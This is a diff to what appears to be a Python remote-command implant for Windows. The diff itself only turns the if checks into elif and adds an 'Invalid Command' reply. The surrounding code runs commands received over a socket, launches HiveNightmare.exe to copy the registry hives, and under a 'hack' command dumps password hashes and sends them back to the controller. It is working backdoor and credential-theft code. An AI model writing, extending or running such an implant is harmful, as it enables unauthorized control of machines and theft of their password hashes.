@@ -30,27 +30,27 @@ while (True):
         s.sendall(bytes("shutting down","utf-8"))
         # os.system("shutdown /s /t 1")
         # The command shuts down the pc so avoid running it
-    if decodedMsg == "openCalc":
+    elif decodedMsg == "openCalc":
         os.system('cmd /c "calc"')
         s.sendall(bytes("opened calc","utf-8"))
 
-    if decodedMsg == "test":
+    elif decodedMsg == "test":
         result = subprocess.run(['dir', 'Desktop'], capture_output=True, shell=True)
         print(result.stdout.decode())
         s.sendall(bytes(result.stdout.decode(), "utf-8"))
-    if decodedMsg == "test1":
+    elif decodedMsg == "test1":
         command = "dir Desktop & echo 'All the files and folders are listed'"
         result = subprocess.run(command, stdout=subprocess.PIPE, shell=True)
         print(result.stdout.decode())
         s.sendall(bytes(result.stdout.decode(), "utf-8"))
     # code to retrieve the registry files (hives)
-    if decodedMsg == "retrieveh":
+    elif decodedMsg == "retrieveh":
         dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Downloads"
         cmdline = "start .\HiveNightmare.exe"
         subprocess.call(cmdline, cwd=dir, shell=True) # run `cmdline` in `dir`
         s.sendall(bytes("done", "utf-8"))
     # dump the hashes and send them via the connection
-    if decodedMsg == "hack":
+    elif decodedMsg == "hack":
         dir = "C:" + "\\" + "Users" + "\\" + os.getlogin() + "\\" + "Downloads"
         systemN = ""
         securityN = ""
@@ -69,9 +69,13 @@ while (True):
         s.sendall(bytes(resulth.stdout.decode(), "utf-8"))
         #s.sendall(bytes(samN, "utf-8"))  
     # just a response so we don't break the message response pattern  
-    if decodedMsg == "getaccess":
+    elif decodedMsg == "getaccess":
         s.sendall(bytes("nice", "utf-8"))
     # https://docs.python.org/3/library/subprocess.html#subprocess.Popen.communicate
     # here we can see that we can get output from certain executions so maybe we can use this to execute commands one by one
     # could include like command and then choose which command to use
+    else:
+        s.sendall(bytes("Invalid Command", "utf-8"))
+
+
 
